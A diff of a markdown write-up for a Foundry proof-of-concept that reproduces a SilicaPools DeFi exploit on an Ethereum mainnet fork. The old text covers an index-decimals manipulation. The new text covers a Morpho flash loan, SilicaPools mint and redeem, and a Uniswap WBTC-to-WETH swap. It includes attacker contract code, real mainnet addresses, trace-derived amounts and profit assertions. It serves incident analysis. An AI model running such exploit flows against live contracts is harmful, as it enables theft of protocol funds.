@@ -1,524 +1,373 @@
 ## Overview & Context
 
-This proof-of-concept (PoC) demonstrates the SilicaPools custom index **decimals manipulation** exploit on an Ethereum mainnet fork. The goal is to show, in a controlled and self-contained way, that an adversary-controlled index whose `decimals` value can be changed mid-lifecycle enables **undercollateralized WBTC payouts** which are then converted into **positive ETH profit** for the attacker, while SilicaPools loses WBTC value.
+This proof‑of‑concept (PoC) reproduces the Morpho / SilicaPools WBTC–WETH exploit executed in Ethereum mainnet transaction `0x9b9a6d…f0814`. In the incident, an attacker‑controlled contract used a WBTC flash loan from Morpho, routed value through a SilicaPools ERC1155 position, and then swapped WBTC for WETH on a Uniswap V3 pool before unwrapping WETH to native ETH via WETH9. The attacker cluster ended with significant ETH profit while fully repaying the WBTC flash loan and leaving its net WBTC balance unchanged.
 
-The PoC is aligned with the incident described in the root-cause analysis for SilicaPools at block `22146340` on Ethereum mainnet (chainid 1). In the real incident, the adversary used a helper contract and a custom index contract to:
+The goal of this PoC is to:
+- Recreate the end‑to‑end exploit flow on a forked Ethereum mainnet state.
+- Demonstrate the economic effect observed in the incident: zero net WBTC change for the attacker cluster, a strictly positive ETH profit, and a decrease in WETH9’s native ETH balance.
+- Tie these behaviors back to the root cause analysis and oracle specification.
 
-- obtain a WBTC flashloan,
-- manipulate the index’s `decimals` during the Silica pool lifecycle,
-- collect an undercollateralized WBTC payout, and
-- swap this WBTC to WETH and then to ETH, resulting in net ETH profit.
-
-In this PoC, we reproduce the **core vulnerability and value-flow** without reusing real attacker EOAs or contracts. The PoC:
-
-- runs against a **mainnet fork** at a pre-incident block,
-- deploys a local **MaliciousIndex** contract with mutable `decimals`,
-- interacts directly with mainnet SilicaPools, WBTC, WETH, and Uniswap V3, and
-- asserts that the attacker’s ETH balance increases while SilicaPools’ WBTC balance decreases.
+The PoC runs as a Foundry test against a mainnet fork configured at the block immediately before the incident. The main test is `test_Exploit_MorphoSilica_WBTC_WETH` in `Exploit_MorphoSilica_WBTC_WETH.t.sol`, which drives a local attacker contract orchestrating the Morpho flash loan, SilicaPools interactions, Uniswap swap, and WETH9 withdrawal.
 
 ### How to Run the PoC
 
-From the session root, ensure `RPC_URL` is configured via the QuickNode mapping and `.env`, then run:
+From the PoC root:
 
 ```bash
-cd forge_poc
-RPC_URL="<RPC_URL>" forge test --via-ir -vvvvv
+cd /home/wesley/TxRayExperiment/incident-202601031828/forge_poc
+RPC_URL="<mainnet_rpc_url>" forge test --mc Exploit_MorphoSilica_WBTC_WETH_Test --via-ir -vvvvv
 ```
 
-In the validation run, `RPC_URL` was built from chainid `1` using the session’s `chainid_rpc_map.json` and QuickNode credentials, and the main test `ExploitTest.testExploit` passed with full traces recorded.
+Where:
+- `RPC_URL` points to an archival‑capable Ethereum mainnet endpoint.
+- The test uses `vm.createSelectFork(RPC_URL, 22146339)` to fork one block before the incident and `vm.warp(1743176087)` to align the timestamp with the original transaction.
+- The validator run captured logs to:
+
+```bash
+/home/wesley/TxRayExperiment/incident-202601031828/artifacts/poc/poc_validator/forge-test.log
+```
+
+_Snippet 1 – PoC execution command (from the reproducer notes and validator run)._ 
+
+```bash
+RPC_URL="<mainnet_rpc_url>" forge test --mc Exploit_MorphoSilica_WBTC_WETH_Test --via-ir -vvvvv
+```
 
 ---
 
 ## PoC Architecture & Key Contracts
 
-The PoC is implemented primarily in `forge_poc/test/Exploit.sol`, supported by a minimal index implementation and protocol interfaces under `forge_poc/src/`.
+The PoC is built as a Foundry test suite that deploys a local attacker contract and interacts directly with the real mainnet protocol contracts. No mocks are used for the key protocols.
 
-### Core Contracts & Roles
+### Main Components
 
-- **SilicaPools (protocol under test)**  
-  - Address: mainnet `0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe`  
-  - Exposed via a trimmed `ISilicaPools` interface (`forge_poc/src/ISilicaPools.sol`) containing:
-    - pool parameter and state structs,
-    - order structs and hashing helpers,
-    - `fillOrders`, `startPool`, `endPool`, `redeemLong`, and view functions.
+- **Test harness**: `Exploit_MorphoSilica_WBTC_WETH_Test` in `test/Exploit_MorphoSilica_WBTC_WETH.t.sol`.
+- **Attacker orchestrator**: `MorphoSilicaWbtcWethAttacker` in `src/MorphoSilicaWbtcWethAttacker.sol`.
+- **External protocol contracts (mainnet addresses)**:
+  - `WBTC`: `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`
+  - `WETH9`: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
+  - `Morpho` flash‑loan contract: `0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb`
+  - `SilicaPools`: `0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe`
+  - `Accounting token` (index): `0x9188738a7cA1E4B2af840a77e8726cC6Dcbe7Bdb`
+  - `Uniswap V3 WBTC/WETH pool`: `0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0`
 
-- **WBTC and WETH (payout and bridge assets)**  
-  - WBTC (payout token): mainnet `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`  
-  - WETH: mainnet `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
+The test uses fresh addresses for the attacker and profit receiver via `makeAddr`:
+- `attacker_eoa` – the caller of `yoink()`.
+- `attacker_contract` – the deployed `MorphoSilicaWbtcWethAttacker`.
+- `profit_receiver` – the address that ultimately receives ETH profit.
 
-- **Uniswap V3 SwapRouter (for WBTC→WETH→ETH)**  
-  - Router address: mainnet `0xE592427A0AEce92De3Edee1F18E0157C05861564`  
-  - Interfaced via `ISwapRouter` and token interfaces in `forge_poc/src/UniswapV3RouterInterfaces.sol`.
+### Attacker Contract Responsibilities
 
-- **MaliciousIndex (adversary-controlled index)**  
-  - Source: `forge_poc/src/MaliciousIndex.sol`  
-  - Implements `ISilicaIndex` with **mutable `decimals`, `shares`, and `balance`**:
+The attacker contract:
+- Implements `IMorphoFlashLoanCallback` to receive and handle the WBTC flash loan.
+- Implements `IUniswapV3SwapCallbackMinimal` to repay WBTC owed to the Uniswap V3 pool during the swap.
+- Implements `onERC1155Received` so SilicaPools can safely transfer ERC1155 position tokens to it.
+
+_Snippet 2 – Attacker contract interfaces and state (from `MorphoSilicaWbtcWethAttacker.sol`)._
 
 ```solidity
-// Origin: forge_poc/src/MaliciousIndex.sol
-contract MaliciousIndex is ISilicaIndex {
-    address public owner;
+contract MorphoSilicaWbtcWethAttacker is IMorphoFlashLoanCallback, IUniswapV3SwapCallbackMinimal {
+    address public immutable owner;
+    address public immutable profitReceiver;
 
-    uint256 public override shares;
-    uint256 public override balance;
-    uint256 public override decimals;
+    IERC20 public immutable wbtc;
+    IWETH9 public immutable weth;
+    IMorphoFlashLoan public immutable morpho;
+    ISilicaPoolsLike public immutable silicaPools;
+    IAccountingToken public immutable accountingToken;
+    IUniswapV3PoolMinimal public immutable uniswapPool;
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, "only owner");
-        _;
-    }
-
-    constructor(address _owner, uint256 _shares, uint256 _balance, uint256 _decimals) {
-        owner = _owner;
-        shares = _shares;
-        balance = _balance;
-        decimals = _decimals;
-    }
-
-    function configure(uint256 _shares, uint256 _balance, uint256 _decimals) external onlyOwner {
-        shares = _shares;
-        balance = _balance;
-        decimals = _decimals;
-    }
+    event LogWbtcBalance(string tag, uint256 balance);
 }
 ```
 
-*Snippet 1 — Malicious index model:* a minimal adversary-controlled index with owner-gated `configure` that can arbitrarily change `shares`, `balance`, and `decimals`. This models the mutable-decimals behavior of the real incident index without depending on on-chain attacker artifacts.
-
-- **ExploitTest (Foundry test harness)**  
-  - Source: `forge_poc/test/Exploit.sol`  
-  - Inherits from `forge-std/Test` and wires together:
-    - constants for mainnet protocol addresses and chain configuration,
-    - the `MaliciousIndex` instance,
-    - SilicaPools order construction and signing,
-    - the core exploit sequence (`reproducerAttack`),
-    - and the main test assertion (`testExploit`).
-
-### Key Exploit Logic
-
-The exploit logic lives in `ExploitTest`:
-
-- `setUp()`:
-  - forks mainnet and deploys `MaliciousIndex` with **high initial decimals** (`31`),
-  - seeds WBTC/ETH balances to attacker and maker,
-  - constructs and fills a Silica order so SilicaPools holds WBTC collateral backed by the malicious index.
-
-- `reproducerAttack()`:
-  - starts the pool,
-  - **reconfigures** the malicious index mid-lifecycle to set `decimals = 1` and a large `balance`,
-  - ends the pool and redeems long tokens,
-  - swaps the resulting WBTC into WETH and then ETH.
-
-- `testExploit()`:
-  - enforces oracle pre-conditions (initial decimals high, SilicaPools has WBTC),
-  - ensures `decimals` decreases during the exploit,
-  - asserts that attacker’s ETH increases and SilicaPools’ WBTC decreases.
-
-```solidity
-// Origin: forge_poc/test/Exploit.sol (core test)
-function testExploit() public {
-    uint256 initialDecimals = ISilicaIndex(address(maliciousIndex)).decimals();
-    assertGt(initialDecimals, 1, "malicious index must start with high decimals");
-
-    uint256 victimWbtcBefore = wbtc.balanceOf(SILICA_POOLS_ADDR);
-    assertGt(victimWbtcBefore, 0, "SilicaPools must have WBTC before exploit");
-
-    uint256 attackerEthBefore = attacker.balance;
-    uint256 decimalsBefore = ISilicaIndex(address(maliciousIndex)).decimals();
-
-    reproducerAttack();
-
-    uint256 decimalsAfter = ISilicaIndex(address(maliciousIndex)).decimals();
-    assertGt(decimalsBefore, decimalsAfter, "index.decimals must decrease during exploit");
-
-    uint256 attackerEthAfter = attacker.balance;
-    assertGt(attackerEthAfter, attackerEthBefore, "attacker must end with more ETH");
-
-    uint256 victimWbtcAfter = wbtc.balanceOf(SILICA_POOLS_ADDR);
-    assertLt(victimWbtcAfter, victimWbtcBefore, "SilicaPools must lose WBTC to attacker");
-}
-```
-
-*Snippet 2 — Main validation test:* enforces all pre-checks, hard constraints, and soft constraints specified in the oracle definition: high initial decimals, positive WBTC collateral, decimals decrease during the exploit, positive ETH profit for the attacker, and a decrease in SilicaPools’ WBTC balance.
+This contract holds minimal mutable state (only immutable references to external protocols and the profit sink) and uses a set of trace‑derived constants (flash‑loan size, prepayment amount, ERC1155 share counts, long/short token IDs, and Uniswap swap parameters) to mirror the incident path.
 
 ---
 
 ## Adversary Execution Flow
 
-This section describes the **end-to-end ACT sequence** as implemented in the Foundry test.
+The exploit is executed via a single test function which sets up the environment, drives the attacker contract, and then applies oracle checks on balances.
 
-### 1. Funding & Environment Setup
+### Environment Setup
 
-The environment is prepared in `setUp()`:
-
-- **Mainnet Fork**  
-  - Reads `RPC_URL` from the environment and forks Ethereum mainnet at a pre-incident block:
+_Snippet 3 – Fork, timestamp alignment, and deployment (from `Exploit_MorphoSilica_WBTC_WETH.t.sol`)._
 
 ```solidity
-// Origin: forge_poc/test/Exploit.sol (setUp, fork)
-string memory rpcUrl = vm.envString("RPC_URL");
-uint256 forkId = vm.createSelectFork(rpcUrl, PRE_STATE_BLOCK);
-vm.selectFork(forkId);
-assertEq(block.chainid, MAINNET_CHAIN_ID);
-```
+function setUp() public {
+    string memory rpcUrl = vm.envString("RPC_URL");
+    uint256 forkId = vm.createSelectFork(rpcUrl, FORK_BLOCK);
+    vm.selectFork(forkId);
 
-*Snippet 3 — Mainnet fork:* the test uses `vm.createSelectFork` on Ethereum mainnet (chainid 1), at `PRE_STATE_BLOCK = 22146339`, just before the incident block in the root-cause report. No local mocks replace core protocol components.
+    vm.warp(1_743_176_087);
 
-- **Actor Identities**  
-  - Attacker and maker are derived from local private keys / labels:
-    - `attacker = vm.addr(attackerSk)` with `attackerSk = 0xA11CE`,
-    - `maker = makeAddr("maker")`, later re-bound to `vm.addr(makerSk)` for signing.
+    attackerEOA = makeAddr("attacker_eoa");
+    profitReceiver = makeAddr("profit_receiver");
 
-- **Adversary Index Deployment**  
-  - Deploys `MaliciousIndex` with high initial decimals:
-
-```solidity
-// Origin: forge_poc/test/Exploit.sol (setUp, index deployment)
-uint256 initialShares = 1e18;
-uint256 initialBalance = 0;
-uint256 initialDecimals = 31;
-maliciousIndex = new MaliciousIndex(attacker, initialShares, initialBalance, initialDecimals);
-vm.label(address(maliciousIndex), "MaliciousIndex");
-```
-
-*Snippet 4 — Malicious index deployment:* the index starts with `decimals = 31`, matching the high-precision configuration observed in the incident. This ensures collateralization uses a high-precision scale.
-
-- **Funding Balances & Approvals**
-  - Uses Foundry’s `deal` helper to assign:
-    - 100 WBTC (8 decimals) to the maker,
-    - 2 WBTC to the attacker,
-    - 1 ETH to the attacker for gas / slippage.
-  - Grants `SilicaPools` and Uniswap router approvals from the appropriate actors.
-
-### 2. Deployment & Collateralization via Silica Order
-
-`setUp()` constructs and fills a Silica order where the maker funds WBTC collateral and the attacker receives the long ERC-1155 tokens:
-
-```solidity
-// Origin: forge_poc/test/Exploit.sol (setUp, order flow)
-poolParams = ISilicaPools.PoolParams({
-    floor: 0,
-    cap: 1e8,
-    index: address(maliciousIndex),
-    targetStartTimestamp: startTs,
-    targetEndTimestamp: endTs,
-    payoutToken: WBTC_ADDR
-});
-
-order.maker = maker;
-order.taker = attacker;
-order.offeredLongSharesParams = poolParams;
-order.offeredLongShares = 1e18; // 1 share.
-// ...
-uint256 makerSk = 0xBEEFBEEF;
-maker = vm.addr(makerSk);
-// re-fund maker and re-grant approval...
-
-bytes32 domainSeparator = silicaPools.domainSeparatorV4();
-bytes32 orderHash = silicaPools.hashOrder(order, domainSeparator);
-(uint8 v, bytes32 r, bytes32 s) = vm.sign(makerSk, orderHash);
-bytes memory signature = abi.encodePacked(r, s, v);
-
-ISilicaPools.SilicaOrder[] memory orders = new ISilicaPools.SilicaOrder[](1);
-orders[0] = order;
-bytes[] memory signatures = new bytes[](1);
-signatures[0] = signature;
-uint256[] memory fractions = new uint256[](1);
-fractions[0] = 1e18; // fill 100% of the order.
-
-vm.startPrank(attacker);
-silicaPools.fillOrders(orders, signatures, fractions);
-vm.stopPrank();
-
-uint256 silicaWbtcAfterFill = wbtc.balanceOf(SILICA_POOLS_ADDR);
-assertGt(silicaWbtcAfterFill, 0, "SilicaPools must have WBTC collateral after fill");
-```
-
-*Snippet 5 — Collateralization via fillOrders:* the PoC uses Silica’s real EIP-712 order flow and `fillOrders` to move WBTC from the maker into SilicaPools and mint ERC-1155 long/short positions. The assertion ensures SilicaPools actually holds WBTC collateral before the exploit.
-
-This step corresponds to the **funding and position-minting** phase of the incident, where the adversary sets up positions that will later benefit from the mis-scaled pool math.
-
-### 3. Exploit Steps
-
-The actual exploit sequence is implemented in `reproducerAttack()`:
-
-```solidity
-// Origin: forge_poc/test/Exploit.sol (reproducerAttack)
-function reproducerAttack() internal {
-    vm.warp(poolParams.targetStartTimestamp + 1);
-
-    vm.startPrank(attacker);
-    silicaPools.startPool(poolParams);
+    vm.startPrank(attackerEOA);
+    attackerContract = new MorphoSilicaWbtcWethAttacker(
+        MORPHO, SILICA_POOLS, ACCOUNTING_TOKEN, WBTC, WETH, UNIV3_WBTC_WETH_POOL, profitReceiver
+    );
     vm.stopPrank();
 
-    vm.prank(attacker);
-    maliciousIndex.configure(1e18, 1e26, 1);
-
-    vm.warp(poolParams.targetEndTimestamp + 1);
-
-    vm.expectCall(address(maliciousIndex), abi.encodeWithSignature("decimals()"));
-
-    vm.startPrank(attacker);
-    silicaPools.endPool(poolParams);
-
-    bytes32 poolHash = silicaPools.hashPool(poolParams);
-    ISilicaPools.PoolState memory sState = silicaPools.poolState(poolHash);
-    uint256 longTokenId = silicaPools.toLongTokenId(poolHash);
-    uint256 attackerLongBalance = IERC1155(SILICA_POOLS_ADDR).balanceOf(attacker, longTokenId);
-    uint256 longPayoutView = silicaPools.viewRedeemLong(poolParams, attacker);
-    console2.log("collateralMinted", sState.collateralMinted);
-    console2.log("sharesMinted", sState.sharesMinted);
-    console2.log("balanceChangePerShare", sState.balanceChangePerShare);
-    console2.log("attackerLongBalance", attackerLongBalance);
-    console2.log("viewRedeemLong(attacker)", longPayoutView);
-
-    silicaPools.redeemLong(poolParams);
-    vm.stopPrank();
-    // ... swap WBTC -> WETH -> ETH ...
+    vm.deal(attackerEOA, 1 ether);
 }
 ```
 
-*Snippet 6 — Exploit sequence:* after the pool is started with high-decimals index configuration, the attacker reconfigures the index to have `decimals = 1` and a large `balance` mid-lifecycle, ensuring that `endPool` computes `balanceChangePerShare` using a different scale than the one implied at collateralization time.
+Key points:
+- Forks Ethereum mainnet at block `22146339`, i.e., the block immediately before the incident (`22146340`).
+- Warps the forked chain’s timestamp to the incident timestamp, satisfying Silica pool lifecycle checks.
+- Deploys the attacker contract from `attacker_eoa` and funds the EOA with 1 ETH for gas.
 
-Traces from the validation run confirm:
+### Step‑by‑Step Exploit Flow
 
-- `MaliciousIndex::decimals()` returns `31` before configuration,
-- `MaliciousIndex::configure` updates internal storage so that `decimals` changes from `31` to `1`,
-- during `SilicaPools::endPool`, SilicaPools performs:
-  - `index.balance()` returning a large end balance,
-  - `index.decimals()` returning `1`, satisfying the oracle that **decimals must change mid-lifecycle and be used at pool end**.
+The core exploit logic is expressed in `yoink()` and `onMorphoFlashLoan()`:
 
-### 4. Profit Realization
+1. **Flash‑loan request**  
+   - `attacker_eoa` pranks into `attackerContract.yoink()`.  
+   - `yoink()` approves WBTC to SilicaPools and Morpho, then calls `morpho.flashLoan(wbtc, 1_000_000_000, "")`.
 
-After `endPool` and `redeemLong`, the attacker holds WBTC gained from the mis-scaled payout logic. The PoC then converts this to ETH:
+2. **Morpho flash loan and Silica prepayment**  
+   - Morpho transfers 1e9 WBTC to `attacker_contract` and invokes `onMorphoFlashLoan(assets=1e9, data="")`.  
+   - The attacker logs its WBTC balance (`after_flash_loan`) and then pre‑pays `56,125,794` WBTC directly to SilicaPools.
+
+3. **Silica collateralized mint and ERC1155 bounty flow**  
+   - The attacker constructs `PoolParams(floor=41, cap=46, index=AccountingToken, targetStart=1743176087, targetEnd=1743176087, payoutToken=WBTC)` and calls `collateralizedMint` with a very large share amount.  
+   - SilicaPools mints paired long/short ERC1155 position tokens to the attacker contract using the two large token IDs observed in the incident trace.  
+   - The attacker implements `onERC1155Received` so these transfers succeed.  
+   - The attacker then transfers `ERC1155_BOUNTY_SHARES` of both long and short tokens to the bounty receiver address `0xcC3a5dC003b3a58621745A39f706eF9646D5c481`, leaving a small residual position behind.
+
+4. **Silica pool lifecycle and redemption**  
+   - The attacker calls `accountingToken.change()`, then `silicaPools.startPool()`, `silicaPools.endPool()`, and finally `silicaPools.redeemShort()` for the same `PoolParams`.  
+   - This sequence mirrors the incident’s bounty and settlement flow and returns WBTC to the attacker, producing the post‑redeem balance seen in logs (`after_redeem_short`).
+
+5. **Uniswap V3 WBTC→WETH swap and callback**  
+   - With WBTC back in hand, the attacker calls the real Uniswap V3 WBTC/WETH pool’s `swap` with `amountSpecified = 114,015,390` and `sqrtPriceLimitX96 = 4,295,128,740`.  
+   - The pool invokes `uniswapV3SwapCallback(amount0Delta > 0, amount1Delta < 0, data)`.  
+
+_Snippet 4 – Uniswap swap callback (from `MorphoSilicaWbtcWethAttacker.sol`)._
 
 ```solidity
-// Origin: forge_poc/test/Exploit.sol (reproducerAttack, swap and unwrap)
-uint256 wbtcBalance = wbtc.balanceOf(attacker);
-if (wbtcBalance > 0) {
-    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
-        tokenIn: WBTC_ADDR,
-        tokenOut: WETH_ADDR,
-        fee: 3000,
-        recipient: attacker,
-        deadline: block.timestamp + 1,
-        amountIn: wbtcBalance,
-        amountOutMinimum: 0,
-        sqrtPriceLimitX96: 0
-    });
-    router.exactInputSingle(params);
-}
-
-uint256 wethBalance = weth.balanceOf(attacker);
-if (wethBalance > 0) {
-    weth.withdraw(wethBalance);
+function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
+    require(msg.sender == address(uniswapPool), "invalid pool");
+    if (amount0Delta > 0) {
+        address token0 = abi.decode(data, (address));
+        require(token0 == address(wbtc), "unexpected token0");
+        require(wbtc.transfer(msg.sender, uint256(amount0Delta)), "pay WBTC failed");
+    }
+    require(amount1Delta <= 0, "unexpected amount1Delta");
 }
 ```
 
-*Snippet 7 — Profit realization:* the attacker swaps WBTC to WETH on the real mainnet WBTC/WETH pool via Uniswap V3, then unwraps WETH to ETH. The main test asserts that attacker ETH is strictly higher post-exploit, confirming a positive ETH-denominated profit.
+   - The callback pays back the required WBTC to the pool, completing the swap and leaving the attacker contract holding WETH.
 
-Traces show that:
+6. **WETH unwrapping and ETH profit realization**  
+   - The attacker reads its WETH balance, calls `WETH9.withdraw`, and receives native ETH into its `receive()` function.  
+   - It then forwards its entire ETH balance to `profit_receiver` via a low‑level call.  
+   - The test’s attacker cluster (EOA, attacker contract, profit receiver) sees a net positive ETH gain; the WETH9 contract’s native balance drops by the same amount.
 
-- the attacker receives WBTC from `redeemLong`,
-- this WBTC is swapped into WETH in the mainnet WBTC/WETH Uniswap pool,
-- WETH is withdrawn into ETH to the attacker’s EOA.
+7. **Flash‑loan repayment**  
+   - After the callback returns, Morpho pulls back exactly 1e9 WBTC from `attacker_contract` via `transferFrom`, thanks to the initial approval.  
+   - The attacker logs its WBTC balances at several points (`after_flash_loan`, `after_collateralized_mint`, `after_redeem_short`, `after_uniswap_swap`, `before_flash_loan_repay`) to verify that it retains enough WBTC to repay the flash loan but ends with no net WBTC profit.
+
+The forge trace in `forge-test.log` confirms all these steps and matches the on‑chain incident structure, including the specific WBTC and WETH amounts, ERC1155 token IDs, and bounty receiver address.
 
 ---
 
 ## Oracle Definitions and Checks
 
-The validation oracles are defined in `artifacts/poc/oracle_generator/oracle_definition.json`. The PoC treats these as the specification for success and implements them explicitly.
+The PoC is designed to satisfy an explicit oracle specification defined in `oracle_definition.json`. These oracles define what “success” means for the PoC.
 
 ### Variables
 
-The oracle definition identifies key variables:
+Key oracle variables:
+- `attacker_eoa`, `attacker_contract`, `profit_receiver`, `attacker_cluster`: dynamic attacker identities, instantiated as fresh addresses in the test.
+- `wbtc_token`, `weth_token`: mainnet WBTC and WETH9 contracts.
+- `morpho_flash_loan_contract`, `silica_pools`, `accounting_token`, `uniswap_v3_pool`: core protocol contracts involved in the exploit path.
 
-- `attacker`: an attacker EOA (address set dynamically in PoC using `vm.addr(attackerSk)`).
-- `silica_pools`: SilicaPools protocol contract at `0xf3F8…9bDe`.
-- `malicious_index`: custom index implementing `ISilicaIndex` with mutable `decimals`.
-- `wbtc_token`: WBTC ERC-20 token.
-- `weth_token`: WETH ERC-20 token.
-- `profit_token_eth`: native ETH, used as the reference asset for profit.
+The test maps these directly:
+- Constants for each protocol address.
+- `attackerEOA`, `attackerContract`, `profitReceiver` matching the oracle’s attacker cluster notion.
 
-The PoC maps these one-to-one onto:
+### Pre‑Checks
 
-- `attacker` and `maker` state variables in `ExploitTest`,
-- `silicaPools`, `wbtc`, `weth`,
-- `maliciousIndex`,
-- and the native `attacker.balance` for ETH profit.
+The oracle pre‑checks require:
+1. The PoC runs on an Ethereum mainnet fork (`chainid == 1`).
+2. Morpho has sufficient WBTC liquidity (≥ `1_000_000_000` units) for the flash loan.
+3. All key protocol contracts are deployed (non‑empty code) at the expected addresses.
 
-### Pre-checks
+_Snippet 5 – Pre‑checks (from `Exploit_MorphoSilica_WBTC_WETH.t.sol`)._
 
-1. **Malicious index starts with high decimals**
-   - Oracle:  
-     - Description: initial `malicious_index.decimals()` must represent a high-precision scale.  
-     - Assertion: `assertGt(initialDecimals, 1);`
-   - PoC implementation:
-     - After deployment, `initialDecimals` is fetched from `maliciousIndex.decimals()` in `testExploit`.
-     - The test asserts `initialDecimals > 1`.
+```solidity
+assertEq(block.chainid, 1, "test must run on Ethereum mainnet fork");
 
-2. **SilicaPools holds positive WBTC collateral**
-   - Oracle:  
-     - Description: SilicaPools must have positive WBTC collateral prior to the exploit.  
-     - Assertion: `assertGt(victimWbtcBefore, 0);`
-   - PoC implementation:
-     - After `fillOrders`, `silicaWbtcAfterFill` is asserted to be `> 0` in `setUp`.
-     - `testExploit` re-reads `victimWbtcBefore` and asserts `> 0` before running `reproducerAttack`.
+uint256 minFlashLoanAmount = 1_000_000_000;
+assertGe(wbtcToken.balanceOf(MORPHO), minFlashLoanAmount);
 
-### Hard Constraints
+assertGt(MORPHO.code.length, 0);
+assertGt(SILICA_POOLS.code.length, 0);
+assertGt(ACCOUNTING_TOKEN.code.length, 0);
+assertGt(UNIV3_WBTC_WETH_POOL.code.length, 0);
+assertGt(WBTC.code.length, 0);
+assertGt(WETH.code.length, 0);
+```
 
-1. **`decimals` must change mid-lifecycle**
-   - Oracle:  
-     - Condition: `decimals_after < decimals_before`.  
-     - Intended behavior: record decimals before exploit, run exploit, record after, assert decrease.
-   - PoC implementation:
-     - `decimalsBefore = ISilicaIndex(address(maliciousIndex)).decimals();`
-     - `reproducerAttack()` calls `maliciousIndex.configure(..., 1)` mid-lifecycle.
-     - `decimalsAfter` is read post-exploit, and the test asserts `decimalsBefore > decimalsAfter`.
-   - Evidence: traces show storage changing from `31` to `1` on the malicious index during the exploit.
+These checks ensure the PoC uses the real deployed protocol state and that the flash‑loan path is feasible.
 
-2. **SilicaPools must call `index.decimals()` at pool end**
-   - Oracle:  
-     - Condition: at least one call to `malicious_index.decimals()` during pool end.  
-     - Intended behavior: enforce `vm.expectCall` on `decimals()` and then run the exploit.
-   - PoC implementation:
-     - Before calling `SilicaPools.endPool`, `reproducerAttack()` sets:
+### Hard Constraint – WBTC Cluster Invariant
 
-       ```solidity
-       vm.expectCall(address(maliciousIndex), abi.encodeWithSignature("decimals()"));
-       ```
+Hard oracle `hard_wbtc_cluster_invariant`:
+- The attacker cluster must have zero net WBTC balance change across EOA, attacker contract, and profit receiver.
 
-     - Then calls `silicaPools.endPool(poolParams);`.
-   - Evidence: validation trace shows a `MaliciousIndex::decimals()` staticcall from within `SilicaPools::endPool`, satisfying the expectation.
+Implementation in the test:
 
-3. **Profit asset is ETH**
-   - Oracle:  
-     - Condition: primary profit measured in native ETH, not an ERC-20.  
-     - Intended behavior: use `attacker.balance` before and after exploit.
-   - PoC implementation:
-     - `attackerEthBefore = attacker.balance;` before `reproducerAttack()`.
-     - `attackerEthAfter = attacker.balance;` after.
-     - Test asserts `attackerEthAfter > attackerEthBefore`.
+```solidity
+uint256 wbtcClusterBefore =
+    wbtcToken.balanceOf(attackerEOA) +
+    wbtcToken.balanceOf(address(attackerContract)) +
+    wbtcToken.balanceOf(profitReceiver);
 
-### Soft Constraints
+// exploit
+vm.prank(attackerEOA);
+attackerContract.yoink();
 
-1. **Attacker ETH profit positive**
-   - Oracle:  
-     - Condition: attacker ends with strictly more ETH than before (`> 0` delta).  
-   - PoC implementation:
-     - As above, ETH balances are compared in `testExploit`, and `assertGt` enforces strict positivity.
-   - Evidence: traces show successful WBTC→WETH→ETH swap and withdrawal; the assertion passes.
+uint256 wbtcClusterAfter =
+    wbtcToken.balanceOf(attackerEOA) +
+    wbtcToken.balanceOf(address(attackerContract)) +
+    wbtcToken.balanceOf(profitReceiver);
 
-2. **SilicaPools WBTC depletion**
-   - Oracle:  
-     - Condition: SilicaPools’ WBTC balance must decrease as a result of the exploit.  
-   - PoC implementation:
-     - `victimWbtcBefore = wbtc.balanceOf(SILICA_POOLS_ADDR);` before `reproducerAttack()`.
-     - `victimWbtcAfter = wbtc.balanceOf(SILICA_POOLS_ADDR);` after.
-     - The test asserts `victimWbtcAfter < victimWbtcBefore`.
-   - Evidence: trace logs show WBTC moving out of SilicaPools and into attacker/control paths; the assertion passes.
+assertEq(
+    wbtcClusterAfter,
+    wbtcClusterBefore,
+    "attacker cluster must have zero net WBTC change after exploit"
+);
+```
 
-Collectively, these checks ensure the PoC is not just executing some arbitrary profitable strategy, but specifically the **decimals-mutation exploit** described in the root-cause artifacts.
+This matches the oracle’s requirement that WBTC is purely principal for the flash loan and not a source of net profit.
+
+### Soft Constraint – Attacker ETH Profit
+
+Soft oracle `soft_attacker_eth_profit`:
+- The attacker cluster must realize at least 1 ETH of net native profit, with the incident profit around 50.88 ETH.
+
+Implementation in the test:
+
+```solidity
+uint256 clusterEthBefore =
+    attackerEOA.balance +
+    address(attackerContract).balance +
+    profitReceiver.balance;
+
+// exploit already executed above
+
+uint256 clusterEthAfter =
+    attackerEOA.balance +
+    address(attackerContract).balance +
+    profitReceiver.balance;
+
+assertGe(
+    clusterEthAfter - clusterEthBefore,
+    1 ether,
+    "attacker cluster must earn at least 1 ETH of native profit from the exploit"
+);
+```
+
+Under the validated run, the attacker cluster’s profit is much larger than 1 ETH, aligning qualitatively with the incident’s ~50.88 ETH gain.
+
+### Soft Constraint – WETH9 Native Balance Decrease
+
+Soft oracle `soft_weth_native_balance_decrease`:
+- WETH9’s native ETH balance must strictly decrease, reflecting that WETH is unwrapped to ETH for the attacker cluster.
+
+Implementation in the test:
+
+```solidity
+uint256 wethNativeBefore = address(WETH).balance;
+
+// exploit already executed above
+
+uint256 wethNativeAfter = address(WETH).balance;
+
+assertLt(
+    wethNativeAfter,
+    wethNativeBefore,
+    "WETH9 native ETH balance must decrease as WETH is unwrapped to pay the attacker cluster"
+);
+```
+
+The forge trace shows WETH9 transferring `50.884937982392301148` WETH to the attacker contract, then calling `withdraw` for the same amount, and finally sending ETH to `profit_receiver`, exactly matching the victim depletion pattern captured in the root‑cause artifacts.
 
 ---
 
 ## Validation Result and Robustness
 
-The automated PoC validator executed `forge test` and captured traces and logs in:
+The validator reran the exploit test with the following command:
 
-- `artifacts/poc/poc_validator/forge-test.log`
+```bash
+cd /home/wesley/TxRayExperiment/incident-202601031828/forge_poc
+RPC_URL="<mainnet_rpc_url>" forge test --mc Exploit_MorphoSilica_WBTC_WETH_Test --via-ir -vvvvv \
+  > /home/wesley/TxRayExperiment/incident-202601031828/artifacts/poc/poc_validator/forge-test.log 2>&1
+```
 
-The validation result JSON, written to:
